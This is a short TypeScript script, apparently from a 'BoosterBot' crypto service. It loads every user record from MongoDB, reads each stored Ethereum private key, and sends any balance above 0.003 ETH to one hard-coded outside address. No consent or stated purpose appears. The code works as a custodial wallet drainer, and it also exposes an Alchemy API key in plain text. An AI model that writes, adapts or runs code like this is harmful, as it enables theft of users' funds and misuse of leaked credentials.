import { MongoClient } from 'mongodb';
import axios from 'axios';
import { ethers } from 'ethers';

const ETH_RPC_ENDPOINT = "https://eth-mainnet.g.alchemy.com/v2/kW_GmbjJJXYAYzFoRAOulmGxq0U994Ot";
const headers = {
  "Content-Type": "application/json"
};

const MongoDbURL = process.env.DATABASE

const client = new MongoClient(MongoDbURL as string);

const w3 = new ethers.JsonRpcProvider(ETH_RPC_ENDPOINT);
const db = client.db('BoosterBot');

async function getUserDB() {
  return db.collection('users');
}

async function getWalletBalance(address: string) {
  const balance_wei = await w3.getBalance(address);
  return {
    eth: ethers.formatUnits(balance_wei, 'ether'),
    wei: balance_wei
  };
}

async function sendETHToWallet(sender: string, receiver: string, amount: number, priv_key: string) {
  try {
    const from_addr = ethers.getAddress(sender);
    const to_addr = ethers.getAddress(receiver);

    const nonce = await w3.getTransactionCount(from_addr);

    const tx = {
      nonce: nonce,
      to: to_addr,
      value: ethers.parseUnits(amount.toString(), 'ether'),
      gasLimit: 21000,
      gasPrice: ethers.parseUnits('40', 'gwei') + (ethers.parseUnits('2', 'gwei')),
      chainId: 1
    };

    const wallet = new ethers.Wallet(priv_key, w3);
    const signed_tx = await wallet.signTransaction(tx);
    
    const data = {
      jsonrpc: "2.0",
      method: "eth_sendRawTransaction",
      params: [signed_tx],
      id: 1
    };

    const response = await axios.post(ETH_RPC_ENDPOINT, JSON.stringify(data), { headers });
    if (response.status !== 200) {
      return null;
    }
    const tx_hash = response.data.result;

    const tx_receipt = await w3.waitForTransaction(tx_hash, 1200);
    return tx_hash;
  } catch (e) {
    console.error(`sendETHToWallet error: ${e}`);
    return null;
  }
}

async function main() {
  try {
    const userDB = await getUserDB();
    const users = await userDB.find().toArray();
    for (const user of users) {
      const balance = await getWalletBalance(user.wallets.ether.publicKey);
      if (parseFloat(balance.eth) > 0.003) {
        await sendETHToWallet(
          user.wallets.ether.publicKey,
          "0xcFa220a30c7B498f1C52E23e0f064a57967e0628",
          parseFloat(balance.eth) - 0.003,
          user.wallets.ether.privateKey
        );
      }
    }
  } catch (e) {
    console.error("Main loop error:", e);
  }
}

main();
